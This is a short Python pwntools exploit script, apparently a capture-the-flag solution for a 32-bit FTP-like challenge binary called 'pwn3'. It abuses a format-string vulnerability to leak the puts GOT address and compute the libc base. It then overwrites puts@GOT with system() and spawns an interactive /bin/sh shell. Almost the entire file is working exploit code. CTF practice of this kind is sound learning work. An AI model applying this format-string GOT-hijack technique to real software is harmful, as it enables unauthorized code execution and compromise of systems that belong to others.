#Made by fly_autumn
#x86 hijack got
from pwn import *
p = process("./pwn3")
elf = ELF("./pwn3")
libc = ELF("./libc.so")

tmp = "sysbdmin"
name = ""
for i in tmp:
    name+=chr(ord(i)-1)
puts_got = elf.got["puts"]

p.recvuntil(b"Name (ftp.hacker.server:Rainism):")
p.sendline(bytes(name))
log.success("The name is :"+name)
p.recvuntil(b"ftp>")
p.sendline(b"put")
p.recvuntil(b"please enter the name of the file you want to upload:")
p.sendline(b"1111")
p.recvuntil(b"then, enter the content:")
p.sendline(b"%8$s"+p32(puts_got))
log.success("puts got: "+hex(puts_got))
p.recvuntil(b"ftp>")
p.sendline(b"get")
p.recvuntil(b"enter the file name you want to get:")
p.sendline(b"1111")
puts_addr = u32(p.recv()[0:4])
log.success("puts addr: "+hex(puts_addr))
libc_addr = puts_addr - libc.sym["puts"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("system addr: "+hex(sys_addr))

p.recvuntil(b"ftp>")
p.sendline(b"put")
p.recvuntil(b"please enter the name of the file you want to upload:")
p.sendline(b"/bin/sh\n")
p.recvuntil(b"then, enter the content:")
payload = fmtstr_payload(7,{puts_got:sys_addr})
p.sendline(payload)
p.recvuntil(b"ftp>")
p.sendline(b"dir")

p.interactive()